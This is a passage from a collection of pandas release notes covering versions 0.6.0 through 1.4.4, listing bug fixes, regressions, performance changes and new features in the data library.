:meth:`.DataFrameGroupBy.cummax` and :meth:`.SeriesGroupBy.cummax` computing wrong result with nullable data types too large to roundtrip when casting to float (:issue:`37493`)\n- Bug in :meth:`DataFrame.rolling` returning mean zero for all ``NaN`` window with ``min_periods=0`` if calculation is not numerical stable (:issue:`41053`)\n- Bug in :meth:`DataFrame.rolling` returning sum not zero for all ``NaN`` window with ``min_periods=0`` if calculation is not numerical stable (:issue:`41053`)\n- Bug in :meth:`.SeriesGroupBy.agg` failing to retain ordered :class:`CategoricalDtype` on order-preserving aggregations (:issue:`41147`)\n- Bug in :meth:`.DataFrameGroupBy.min`, :meth:`.SeriesGroupBy.min`, :meth:`.DataFrameGroupBy.max` and :meth:`.SeriesGroupBy.max` with multiple object-dtype columns and ``numeric_only=False`` incorrectly raising a ``ValueError`` (:issue:`41111`)\n- Bug in :meth:`.DataFrameGroupBy.rank` with the GroupBy object's ``axis=0`` and the ``rank`` method's keyword ``axis=1`` (:issue:`41320`)\n- Bug in :meth:`DataFrameGroupBy.__getitem__` with non-unique columns incorrectly returning a malformed :class:`SeriesGroupBy` instead of :class:`DataFrameGroupBy` (:issue:`41427`)\n- Bug in :meth:`.DataFrameGroupBy.transform` with non-unique columns incorrectly raising an ``AttributeError`` (:issue:`41427`)\n- Bug in :meth:`.Resampler.apply` with non-unique columns incorrectly dropping duplicated columns (:issue:`41445`)\n- Bug in :meth:`Series.groupby` aggregations incorrectly returning empty :class:`Series` instead of raising ``TypeError`` on aggregations that are invalid for its dtype, e.g. ``.prod`` with ``datetime64[ns]`` dtype (:issue:`41342`)\n- Bug in :class:`DataFrameGroupBy` aggregations incorrectly failing to drop columns with invalid dtypes for that aggregation when there are no valid columns (:issue:`41291`)\n- Bug in :meth:`DataFrame.rolling.__iter__` where ``on`` was not assigned to the index of the resulting objects (:issue:`40373`)\n- Bug in :meth:`.DataFrameGroupBy.transform` and :meth:`.DataFrameGroupBy.agg` with ``engine=\"numba\"`` where ``*args`` were being cached with the user passed function (:issue:`41647`)\n- Bug in :class:`DataFrameGroupBy` methods ``agg``, ``transform``, ``sum``, ``bfill``, ``ffill``, ``pad``, ``pct_change``, ``shift``, ``ohlc`` dropping ``.columns.names`` (:issue:`41497`)\n\n\nReshaping\n^^^^^^^^^\n- Bug in :func:`merge` raising error when performing an inner join with partial index and ``right_index=True`` when there was no overlap between indices (:issue:`33814`)\n- Bug in :meth:`DataFrame.unstack` with missing levels led to incorrect index names (:issue:`37510`)\n- Bug in :func:`merge_asof` propagating the right Index with ``left_index=True`` and ``right_on`` specification instead of left Index (:issue:`33463`)\n- Bug in :meth:`DataFrame.join` on a DataFrame with a :class:`MultiIndex` returned the wrong result when one of both indexes had only one level (:issue:`36909`)\n- :func:`merge_asof` now raises a ``ValueError`` instead of a cryptic ``TypeError`` in case of non-numerical merge columns (:issue:`29130`)\n- Bug in :meth:`DataFrame.join` not assigning values correctly when the DataFrame had a :class:`MultiIndex` where at least one dimension had dtype ``Categorical`` with non-alphabetically sorted categories (:issue:`38502`)\n- :meth:`Series.value_counts` and :meth:`Series.mode` now return consistent keys in original order (:issue:`12679`, :issue:`11227` and :issue:`39007`)\n- Bug in :meth:`DataFrame.stack` not handling ``NaN`` in :class:`MultiIndex` columns correctly (:issue:`39481`)\n- Bug in :meth:`DataFrame.apply` would give incorrect results when the argument ``func`` was a string, ``axis=1``, and the axis argument was not supported; now raises a ``ValueError`` instead (:issue:`39211`)\n- Bug in :meth:`DataFrame.sort_values` not reshaping the index correctly after sorting on columns when ``ignore_index=True`` (:issue:`39464`)\n- Bug in :meth:`DataFrame.append` returning incorrect dtypes with combinations of ``ExtensionDtype`` dtypes (:issue:`39454`)\n- Bug in :meth:`DataFrame.append` returning incorrect dtypes when used with combinations of ``datetime64`` and ``timedelta64`` dtypes (:issue:`39574`)\n- Bug in :meth:`DataFrame.append` with a :class:`DataFrame` with a :class:`MultiIndex` and appending a :class:`Series` whose :class:`Index` is not a :class:`MultiIndex` (:issue:`41707`)\n- Bug in :meth:`DataFrame.pivot_table` returning a :class:`MultiIndex` for a single value when operating on an empty DataFrame (:issue:`13483`)\n- :class:`Index` can now be passed to the :func:`numpy.all` function (:issue:`40180`)\n- Bug in :meth:`DataFrame.stack` not preserving ``CategoricalDtype`` in a :class:`MultiIndex` (:issue:`36991`)\n- Bug in :func:`to_datetime` raising an error when the input sequence contained unhashable items (:issue:`39756`)\n- Bug in :meth:`Series.explode` preserving the index when ``ignore_index`` was ``True`` and values were scalars (:issue:`40487`)\n- Bug in :func:`to_datetime` raising a ``ValueError`` when :class:`Series` contains ``None`` and ``NaT`` and has more than 50 elements (:issue:`39882`)\n- Bug in :meth:`Series.unstack` and :meth:`DataFrame.unstack` with object-dtype values containing timezone-aware datetime objects incorrectly raising ``TypeError`` (:issue:`41875`)\n- Bug in :meth:`DataFrame.melt` raising ``InvalidIndexError`` when :class:`DataFrame` has duplicate columns used as ``value_vars`` (:issue:`41951`)\n\nSparse\n^^^^^^\n- Bug in :meth:`DataFrame.sparse.to_coo` raising a ``KeyError`` with columns that are a numeric :class:`Index` without a ``0`` (:issue:`18414`)\n- Bug in :meth:`SparseArray.astype` with ``copy=False`` producing incorrect results when going from integer dtype to floating dtype (:issue:`34456`)\n- Bug in :meth:`SparseArray.max` and :meth:`SparseArray.min` would always return an empty result (:issue:`40921`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n- Bug in :meth:`DataFrame.where` when ``other`` is a Series with an :class:`ExtensionDtype` (:issue:`38729`)\n- Fixed bug where :meth:`Series.idxmax`, :meth:`Series.idxmin`, :meth:`Series.argmax`, and :meth:`Series.argmin` would fail when the underlying data is an :class:`ExtensionArray` (:issue:`32749`, :issue:`33719`, :issue:`36566`)\n- Fixed bug where some properties of subclasses of :class:`PandasExtensionDtype` where improperly cached (:issue:`40329`)\n- Bug in :meth:`DataFrame.mask` where masking a DataFrame with an :class:`ExtensionDtype` raises a ``ValueError`` (:issue:`40941`)\n\nStyler\n^^^^^^\n- Bug in :class:`.Styler` where the ``subset`` argument in methods raised an error for some valid MultiIndex slices (:issue:`33562`)\n- :class:`.Styler` rendered HTML output has seen minor alterations to support w3 good code standards (:issue:`39626`)\n- Bug in :class:`.Styler` where rendered HTML was missing a column class identifier for certain header cells (:issue:`39716`)\n- Bug in :meth:`.Styler.background_gradient` where text-color was not determined correctly (:issue:`39888`)\n- Bug in :meth:`.Styler.set_table_styles` where multiple elements in CSS-selectors of the ``table_styles`` argument were not correctly added (:issue:`34061`)\n- Bug in :class:`.Styler` where copying from Jupyter dropped the top left cell and misaligned headers (:issue:`12147`)\n- Bug in :class:`Styler.where` where ``kwargs`` were not passed to the applicable callable (:issue:`40845`)\n- Bug in :class:`.Styler` causing CSS to duplicate on multiple renders (:issue:`39395`, :issue:`40334`)\n\nOther\n^^^^^\n- ``inspect.getmembers(Series)`` no longer raises an ``AbstractMethodError`` (:issue:`38782`)\n- Bug in :meth:`Series.where` with numeric dtype and ``other=None`` not casting to ``nan`` (:issue:`39761`)\n- Bug in :func:`.assert_series_equal`, :func:`.assert_frame_equal`, :func:`.assert_index_equal` and :func:`.assert_extension_array_equal` incorrectly raising when an attribute has an unrecognized NA type (:issue:`39461`)\n- Bug in :func:`.assert_index_equal` with ``exact=True`` not raising when comparing :class:`CategoricalIndex` instances with ``Int64Index`` and ``RangeIndex`` categories (:issue:`41263`)\n- Bug in :meth:`DataFrame.equals`, :meth:`Series.equals`, and :meth:`Index.equals` with object-dtype containing ``np.datetime64(\"NaT\")`` or ``np.timedelta64(\"NaT\")`` (:issue:`39650`)\n- Bug in :func:`show_versions` where console JSON output was not proper JSON (:issue:`39701`)\n- pandas can now compile on z/OS when using `xlc <https://www.ibm.com/products/xl-cpp-compiler-zos>`_ (:issue:`35826`)\n- Bug in :func:`pandas.util.hash_pandas_object` not recognizing ``hash_key``, ``encoding`` and ``categorize`` when the input object type is a :class:`DataFrame` (:issue:`41404`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_130.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.2.5..v1.3.0\n", "1.1.5": ".. _whatsnew_115:\n\nWhat's new in 1.1.5 (December 07, 2020)\n---------------------------------------\n\nThese are the changes in pandas 1.1.5. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_115.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in addition of a timedelta-like scalar to a :class:`DatetimeIndex` raising incorrectly (:issue:`37295`)\n- Fixed regression in :meth:`Series.groupby` raising when the :class:`Index` of the :class:`Series` had a tuple as its name (:issue:`37755`)\n- Fixed regression in :meth:`DataFrame.loc` and :meth:`Series.loc` for ``__setitem__`` when one-dimensional tuple was given to select from :class:`MultiIndex` (:issue:`37711`)\n- Fixed regression in inplace operations on :class:`Series` with ``ExtensionDtype`` with NumPy dtyped operand (:issue:`37910`)\n- Fixed regression in metadata propagation for ``groupby`` iterator (:issue:`37343`)\n- Fixed regression in :class:`MultiIndex` constructed from a :class:`DatetimeIndex` not retaining frequency (:issue:`35563`)\n- Fixed regression in :class:`Index` constructor raising a ``AttributeError`` when passed a :class:`SparseArray` with datetime64 values (:issue:`35843`)\n- Fixed regression in :meth:`DataFrame.unstack` with columns with integer dtype (:issue:`37115`)\n- Fixed regression in indexing on a :class:`Series` with ``CategoricalDtype`` after unpickling (:issue:`37631`)\n- Fixed regression in :meth:`DataFrame.groupby` aggregation with out-of-bounds datetime objects in an object-dtype column (:issue:`36003`)\n- Fixed regression in ``df.groupby(..).rolling(..)`` with the resulting :class:`MultiIndex` when grouping by a label that is in the index (:issue:`37641`)\n- Fixed regression in :meth:`DataFrame.fillna` not filling ``NaN`` after other operations such as :meth:`DataFrame.pivot` (:issue:`36495`).\n- Fixed performance regression in ``df.groupby(..).rolling(..)`` (:issue:`38038`)\n- Fixed regression in :meth:`MultiIndex.intersection` returning duplicates when at least one of the indexes had duplicates (:issue:`36915`)\n- Fixed regression in :meth:`.DataFrameGroupBy.first`, :meth:`.SeriesGroupBy.first`, :meth:`.DataFrameGroupBy.last`, and :meth:`.SeriesGroupBy.last` where ``None`` was considered a non-NA value (:issue:`38286`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_115.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in pytables methods in python 3.9 (:issue:`38041`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_115.other:\n\nOther\n~~~~~\n- Only set ``-Werror`` as a compiler flag in the CI jobs (:issue:`33315`, :issue:`33314`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_115.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.4..v1.1.5|HEAD\n", "1.4.4": ".. _whatsnew_144:\n\nWhat's new in 1.4.4 (August 31, 2022)\n-------------------------------------\n\nThese are the changes in pandas 1.4.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_144.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.fillna` not working on a :class:`DataFrame` with a :class:`MultiIndex` (:issue:`47649`)\n- Fixed regression in taking NULL :class:`objects` from a :class:`DataFrame` causing a segmentation violation. These NULL values are created by :meth:`numpy.empty_like` (:issue:`46848`)\n- Fixed regression in :func:`concat` materializing the :class:`Index` during sorting even if the :class:`Index` was already sorted (:issue:`47501`)\n- Fixed regression in :func:`concat` or :func:`merge` handling of all-NaN ExtensionArrays with custom attributes (:issue:`47762`)\n- Fixed regression in calling bitwise numpy ufuncs (for example, ``np.bitwise_and``) on Index objects (:issue:`46769`)\n- Fixed regression in :func:`cut` when using a ``datetime64`` IntervalIndex as bins (:issue:`46218`)\n- Fixed regression in :meth:`DataFrame.select_dtypes` where ``include=\"number\"`` included :class:`BooleanDtype` (:issue:`46870`)\n- Fixed regression in :meth:`DataFrame.loc` raising error when indexing with a ``NamedTuple`` (:issue:`48124`)\n- Fixed regression in :meth:`DataFrame.loc` not updating the cache correctly after values were set (:issue:`47867`)\n- Fixed regression in :meth:`DataFrame.loc` not aligning index in some cases when setting a :class:`DataFrame` (:issue:`47578`)\n- Fixed regression in :meth:`DataFrame.loc` setting a length-1 array like value to a single value in the DataFrame (:issue:`46268`)\n- Fixed regression when slicing with :meth:`DataFrame.loc` with :class:`DatetimeIndex` with a :class:`.DateOffset` object for its ``freq`` (:issue:`46671`)\n- Fixed regression in setting ``None`` or non-string value into a ``string``-dtype Series using a mask (:issue:`47628`)\n- Fixed regression in updating a DataFrame column through Series ``__setitem__`` (using chained assignment) not updating column values inplace and using too much memory (:issue:`47172`)\n- Fixed regression in :meth:`DataFrame.select_dtypes` returning a view on the original DataFrame (:issue:`48090`)\n- Fixed regression using custom Index subclasses (for example, used in xarray) with :meth:`~DataFrame.reset_index` or :meth:`Index.insert` (:issue:`47071`)\n- Fixed regression in :meth:`~Index.intersection` when the :class:`DatetimeIndex` has dates crossing daylight savings time (:issue:`46702`)\n- Fixed regression in :func:`merge` throwing an error when passing a :class:`Series` with a multi-level name (:issue:`47946`)\n- Fixed regression in :meth:`DataFrame.eval` creating a copy when updating inplace (:issue:`47449`)\n- Fixed regression where getting a row using :meth:`DataFrame.iloc` with :class:`SparseDtype` would raise (:issue:`46406`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_144.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- The ``FutureWarning`` raised when passing arguments (other than ``filepath_or_buffer``) as positional in :func:`read_csv` is now raised at the correct stacklevel (:issue:`47385`)\n- Bug in :meth:`DataFrame.to_sql` when ``method`` was a ``callable`` that did not return an ``int`` and would raise a ``TypeError`` (:issue:`46891`)\n- Bug in :meth:`.DataFrameGroupBy.value_counts` where ``subset`` had no effect (:issue:`46383`)\n- Bug when getting values with :meth:`DataFrame.loc` with a list of keys causing an internal inconsistency that could lead to a disconnect between ``frame.at[x, y]`` vs ``frame[y].loc[x]`` (:issue:`22372`)\n- Bug in the :meth:`Series.dt.strftime` accessor return a float instead of object dtype Series for all-NaT input, which also causes a spurious deprecation warning (:issue:`45858`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_144.other:\n\nOther\n~~~~~\n- The minimum version of Cython needed to compile pandas is now ``0.29.32`` (:issue:`47978`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_144.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.4.3..v1.4.4|HEAD\n", "0.6.0": ".. _whatsnew_060:\n\nVersion 0.6.0 (November 25, 2011)\n---------------------------------\n\n{{ header }}\n\nNew features\n~~~~~~~~~~~~\n- :ref:`Added <reshaping.melt>` ``melt`` function to ``pandas.core.reshape``\n- :ref:`Added <groupby.multiindex>` ``level`` parameter to group by level in Series and DataFrame descriptive statistics (:issue:`313`)\n- :ref:`Added <basics.head_tail>` ``head`` and ``tail`` methods to Series, analogous to DataFrame (:issue:`296`)\n- :ref:`Added <indexing.boolean>` ``Series.isin`` function which checks if each value is contained in a passed sequence (:issue:`289`)\n- :ref:`Added <io.formatting>` ``float_format`` option to ``Series.to_string``\n- :ref:`Added <io.parse_dates>` ``skip_footer`` (:issue:`291`) and ``converters`` (:issue:`343`) options to ``read_csv`` and ``read_table``\n- :ref:`Added <indexing.duplicate>` ``drop_duplicates`` and ``duplicated`` functions for removing duplicate DataFrame rows and checking for duplicate rows, respectively (:issue:`319`)\n- :ref:`Implemented <dsintro.boolean>` operators '&', '|', '^', '-' on DataFrame (:issue:`347`)\n- :ref:`Added <basics.stats>` ``Series.mad``, mean absolute deviation\n- :ref:`Added <timeseries.offsets>` ``QuarterEnd`` DateOffset (:issue:`321`)\n- :ref:`Added <dsintro.numpy_interop>` ``dot`` to DataFrame (:issue:`65`)\n- Added ``orient`` option to ``Panel.from_dict`` (:issue:`359`, :issue:`301`)\n- :ref:`Added <basics.dataframe.from_dict>` ``orient`` option to ``DataFrame.from_dict``\n- :ref:`Added <basics.dataframe.from_records>` passing list of tuples or list of lists to ``DataFrame.from_records`` (:issue:`357`)\n- :ref:`Added <groupby.multiindex>` multiple levels to groupby (:issue:`103`)\n- :ref:`Allow <basics.sorting>` multiple columns in ``by`` argument of ``DataFrame.sort_index`` (:issue:`92`, :issue:`362`)\n- :ref:`Added <indexing.basics.get_value>` fast ``get_value`` and ``put_value`` methods to DataFrame (:issue:`360`)\n- Added ``cov`` instance methods to Series and DataFrame (:issue:`194`, :issue:`362`)\n- :ref:`Added <visualization.barplot>` ``kind='bar'`` option to ``DataFrame.plot`` (:issue:`348`)\n- :ref:`Added <basics.idxmin>` ``idxmin`` and ``idxmax`` to Series and DataFrame (:issue:`286`)\n- :ref:`Added <io.clipboard>` ``read_clipboard`` function to parse DataFrame from clipboard (:issue:`300`)\n- :ref:`Added <basics.stats>` ``nunique`` function to Series for counting unique elements (:issue:`297`)\n- :ref:`Made <basics.dataframe>` DataFrame constructor use Series name if no columns passed (:issue:`373`)\n- :ref:`Support <io.parse_dates>` regular expressions in read_table/read_csv (:issue:`364`)\n- :ref:`Added <io.html>` ``DataFrame.to_html`` for writing DataFrame to HTML (:issue:`387`)\n- :ref:`Added <basics.dataframe>` support for MaskedArray data in DataFrame, masked values converted to NaN (:issue:`396`)\n- :ref:`Added <visualization.box>` ``DataFrame.boxplot`` function (:issue:`368`)\n- :ref:`Can <basics.apply>` pass extra args, kwds to DataFrame.apply (:issue:`376`)\n- :ref:`Implement <merging.multikey_join>` ``DataFrame.join`` with vector ``on`` argument (:issue:`312`)\n- :ref:`Added <visualization.basic>` ``legend`` boolean flag to ``DataFrame.plot`` (:issue:`324`)\n- :ref:`Can <reshaping.stacking>` pass multiple levels to ``stack`` and ``unstack`` (:issue:`370`)\n- :ref:`Can <reshaping.pivot>` pass multiple values columns to ``pivot_table`` (:issue:`381`)\n- :ref:`Use <groupby.multiindex>` Series name in GroupBy for result index (:issue:`363`)\n- :ref:`Added <basics.apply>` ``raw`` option to ``DataFrame.apply`` for performance if only need ndarray (:issue:`309`)\n- Added proper, tested weighted least squares to standard and panel OLS (:issue:`303`)\n\nPerformance enhancements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- VBENCH Cythonized ``cache_readonly``, resulting in substantial micro-performance enhancements throughout the code base (:issue:`361`)\n- VBENCH Special Cython matrix iterator for applying arbitrary reduction operations with 3-5x better performance than ``np.apply_along_axis`` (:issue:`309`)\n- VBENCH Improved performance of ``MultiIndex.from_tuples``\n- VBENCH Special Cython matrix iterator for applying arbitrary reduction operations\n- VBENCH + DOCUMENT Add ``raw`` option to ``DataFrame.apply`` for getting better performance when\n- VBENCH Faster cythonized count by level in Series and DataFrame (:issue:`341`)\n- VBENCH? Significant GroupBy performance enhancement with multiple keys with many \"empty\" combinations\n- VBENCH New Cython vectorized function ``map_infer`` speeds up ``Series.apply`` and ``Series.map`` significantly when passed elementwise Python function, motivated by (:issue:`355`)\n- VBENCH Significantly improved performance of ``Series.order``, which also makes np.unique called on a Series faster (:issue:`327`)\n- VBENCH Vastly improved performance of GroupBy on axes with a MultiIndex (:issue:`299`)\n\n\n\n.. _whatsnew_0.6.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.5.0..v0.6.0\n", "1.2.2": ".. _whatsnew_122:\n\nWhat's new in 1.2.2 (February 09, 2021)\n---------------------------------------\n\nThese are the changes in pandas 1.2.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_122.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :func:`read_excel` that caused it to raise ``AttributeError`` when checking version of older xlrd versions (:issue:`38955`)\n- Fixed regression in :class:`DataFrame` constructor reordering element when construction from datetime ndarray with dtype not ``\"datetime64[ns]\"`` (:issue:`39422`)\n- Fixed regression in :meth:`DataFrame.astype` and :meth:`Series.astype` not casting to bytes dtype (:issue:`39474`)\n- Fixed regression in :meth:`~DataFrame.to_pickle` failing to create bz2/xz compressed pickle files with ``protocol=5`` (:issue:`39002`)\n- Fixed regression in :func:`pandas.testing.assert_series_equal` and :func:`pandas.testing.assert_frame_equal` always raising ``AssertionError`` when comparing extension dtypes (:issue:`39410`)\n- Fixed regression in :meth:`~DataFrame.to_csv` opening ``codecs.StreamWriter`` in binary mode instead of in text mode and ignoring user-provided ``mode`` (:issue:`39247`)\n- Fixed regression in :meth:`Categorical.astype` casting to incorrect dtype when ``np.int32`` is passed to dtype argument (:issue:`39402`)\n- Fixed regression in :meth:`~DataFrame.to_excel` creating corrupt files when appending (``mode=\"a\"``) to an existing file (:issue:`39576`)\n- Fixed regression in :meth:`DataFrame.transform` failing in case of an empty DataFrame or Series (:issue:`39636`)\n- Fixed regression in :meth:`~DataFrame.groupby` or :meth:`~DataFrame.resample` when aggregating an all-NaN or numeric object dtype column (:issue:`39329`)\n- Fixed regression in :meth:`.Rolling.count` where the ``min_periods`` argument would be set to ``0`` after the operation (:issue:`39554`)\n- Fixed regression in :func:`read_excel` that incorrectly raised when the argument ``io`` was a non-path and non-buffer and the ``engine`` argument was specified (:issue:`39528`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_122.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- :func:`pandas.read_excel` error message when a specified ``sheetname`` does not exist is now uniform across engines (:issue:`39250`)\n- Fixed bug in :func:`pandas.read_excel` producing incorrect results when the engine ``openpyxl`` is used and the excel file is missing or has incorrect dimension information; the fix requires ``openpyxl`` >= 3.0.0, prior versions may still fail (:issue:`38956`, :issue:`39001`)\n- Fixed bug in :func:`pandas.read_excel` sometimes producing a ``DataFrame`` with trailing rows of ``np.nan`` when the engine ``openpyxl`` is used (:issue:`39181`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_122.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.2.1..v1.2.2\n", "1.1.1": ".. _whatsnew_111:\n\nWhat's new in 1.1.1 (August 20, 2020)\n-------------------------------------\n\nThese are the changes in pandas 1.1.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_111.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :meth:`CategoricalIndex.format` where, when stringified scalars had different lengths, the shorter string would be right-filled with spaces, so it had the same length as the longest string (:issue:`35439`)\n- Fixed regression in :meth:`Series.truncate` when trying to truncate a single-element series (:issue:`35544`)\n- Fixed regression where :meth:`DataFrame.to_numpy` would raise a ``RuntimeError`` for mixed dtypes when converting to ``str`` (:issue:`35455`)\n- Fixed regression where :func:`read_csv` would raise a ``ValueError`` when ``pandas.options.mode.use_inf_as_na`` was set to ``True`` (:issue:`35493`)\n- Fixed regression where :func:`pandas.testing.assert_series_equal` would raise an error when non-numeric dtypes were passed with ``check_exact=True`` (:issue:`35446`)\n- Fixed regression in ``.groupby(..).rolling(..)`` where column selection was ignored (:issue:`35486`)\n- Fixed regression where :meth:`DataFrame.interpolate` would raise a ``TypeError`` when the :class:`DataFrame` was empty (:issue:`35598`)\n- Fixed regression in :meth:`DataFrame.shift` with ``axis=1`` and heterogeneous dtypes (:issue:`35488`)\n- Fixed regression in :meth:`DataFrame.diff` with read-only data (:issue:`35559`)\n- Fixed regression in ``.groupby(..).rolling(..)`` where a segfault would occur with ``center=True`` and an odd number of values (:issue:`35552`)\n- Fixed regression in :meth:`DataFrame.apply` where functions that altered the input in-place only operated on a single row (:issue:`35462`)\n- Fixed regression in :meth:`DataFrame.reset_index` would raise a ``ValueError`` on empty :class:`DataFrame` with a :class:`MultiIndex` with a ``datetime64`` dtype level (:issue:`35606`, :issue:`35657`)\n- Fixed regression where :func:`pandas.merge_asof` would raise a ``UnboundLocalError`` when ``left_index``, ``right_index`` and ``tolerance`` were set (:issue:`35558`)\n- Fixed regression in ``.groupby(..).rolling(..)`` where a custom ``BaseIndexer`` would be ignored (:issue:`35557`)\n- Fixed regression in :meth:`DataFrame.replace` and :meth:`Series.replace` where compiled regular expressions would be ignored during replacement (:issue:`35680`)\n- Fixed regression in :meth:`.DataFrameGroupBy.aggregate` where a list of functions would produce the wrong results if at least one of the functions did not aggregate (:issue:`35490`)\n- Fixed memory usage issue when instantiating large :class:`pandas.arrays.StringArray` (:issue:`35499`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_111.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in :class:`~pandas.io.formats.style.Styler` whereby ``cell_ids`` argument had no effect due to other recent changes (:issue:`35588`) (:issue:`35663`)\n- Bug in :func:`pandas.testing.assert_series_equal` and :func:`pandas.testing.assert_frame_equal` where extension dtypes were not ignored when ``check_dtypes`` was set to ``False`` (:issue:`35715`)\n- Bug in :meth:`to_timedelta` fails when ``arg`` is a :class:`Series` with ``Int64`` dtype containing null values (:issue:`35574`)\n- Bug in ``.groupby(..).rolling(..)`` where passing ``closed`` with column selection would raise a ``ValueError`` (:issue:`35549`)\n- Bug in :class:`DataFrame` constructor failing to raise ``ValueError`` in some cases when ``data`` and ``index`` have mismatched lengths (:issue:`33437`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_111.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.0..v1.1.1\n", "1.4.1": ".. _whatsnew_141:\n\nWhat's new in 1.4.1 (February 12, 2022)\n---------------------------------------\n\nThese are the changes in pandas 1.4.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_141.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Regression in :meth:`Series.mask` with ``inplace=True`` and ``PeriodDtype`` and an incompatible ``other`` coercing to a common dtype instead of raising (:issue:`45546`)\n- Regression in :func:`.assert_frame_equal` not respecting ``check_flags=False`` (:issue:`45554`)\n- Regression in :meth:`DataFrame.loc` raising ``ValueError`` when indexing (getting values) on a :class:`MultiIndex` with one level (:issue:`45779`)\n- Regression in :meth:`Series.fillna` with ``downcast=False`` incorrectly downcasting ``object`` dtype (:issue:`45603`)\n- Regression in :func:`api.types.is_bool_dtype` raising an ``AttributeError`` when evaluating a categorical :class:`Series` (:issue:`45615`)\n- Regression in :meth:`DataFrame.iat` setting values leading to not propagating correctly in subsequent lookups (:issue:`45684`)\n- Regression when setting values with :meth:`DataFrame.loc` losing :class:`Index` name if :class:`DataFrame` was empty before (:issue:`45621`)\n- Regression in :meth:`~Index.join` with overlapping :class:`IntervalIndex` raising an ``InvalidIndexError`` (:issue:`45661`)\n- Regression when setting values with :meth:`Series.loc` raising with all ``False`` indexer and :class:`Series` on the right hand side (:issue:`45778`)\n- Regression in :func:`read_sql` with a DBAPI2 connection that is not an instance of ``sqlite3.Connection`` incorrectly requiring SQLAlchemy be installed (:issue:`45660`)\n- Regression in :class:`DateOffset` when constructing with an integer argument with no keywords (e.g. ``pd.DateOffset(n)``) would behave like ``datetime.timedelta(days=0)`` (:issue:`45643`, :issue:`45890`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_141.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed segfault in :meth:`DataFrame.to_json` when dumping tz-aware datetimes in Python 3.10 (:issue:`42130`)\n- Stopped emitting unnecessary ``FutureWarning`` in :meth:`DataFrame.sort_values` with sparse columns (:issue:`45618`)\n- Fixed window aggregations in :meth:`DataFrame.rolling` and :meth:`Series.rolling` to skip over unused elements (:issue:`45647`)\n- Fixed builtin highlighters in :class:`.Styler` to be responsive to ``NA`` with nullable dtypes (:issue:`45804`)\n- Bug in :meth:`~Rolling.apply` with ``axis=1`` raising an erroneous ``ValueError`` (:issue:`45912`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_141.other:\n\nOther\n~~~~~\n- Reverted performance speedup of :meth:`DataFrame.corr` for ``method=pearson`` to fix precision regression (:issue:`45640`, :issue:`42761`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_141.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.4.0..v1.4.1\n", "0.7.0": ".. _whatsnew_0700:\n\nVersion 0.7.0 (February 9, 2012)\n--------------------------------\n\n{{ header }}\n\n\nNew features\n~~~~~~~~~~~~\n\n- New unified :ref:`merge function <merging.join>` for efficiently performing\n  full gamut of database / relational-algebra operations. Refactored existing\n  join methods to use the new infrastructure, resulting in substantial\n  performance gains (:issue:`220`, :issue:`249`, :issue:`267`)\n\n- New :ref:`unified concatenation function <merging.concat>` for concatenating\n  Series, DataFrame or Panel objects along an axis. Can form union or\n  intersection of the other axes. Improves performance of ``Series.append`` and\n  ``DataFrame.append`` (:issue:`468`, :issue:`479`, :issue:`273`)\n\n- Can pass multiple DataFrames to\n  ``DataFrame.append`` to concatenate (stack) and multiple Series to\n  ``Series.append`` too\n\n- :ref:`Can<basics.dataframe.from_list_of_dicts>` pass list of dicts (e.g., a\n  list of JSON objects) to DataFrame constructor (:issue:`526`)\n\n- You can now :ref:`set multiple columns <indexing.columns.multiple>` in a\n  DataFrame via ``__getitem__``, useful for transformation (:issue:`342`)\n\n- Handle differently-indexed output values in ``DataFrame.apply`` (:issue:`498`)\n\n.. code-block:: ipython\n\n   In [1]: df = pd.DataFrame(np.random.randn(10, 4))\n   In [2]: df.apply(lambda x: x.describe())\n   Out[2]:\n                  0          1          2          3\n   count  10.000000  10.000000  10.000000  10.000000\n   mean    0.190912  -0.395125  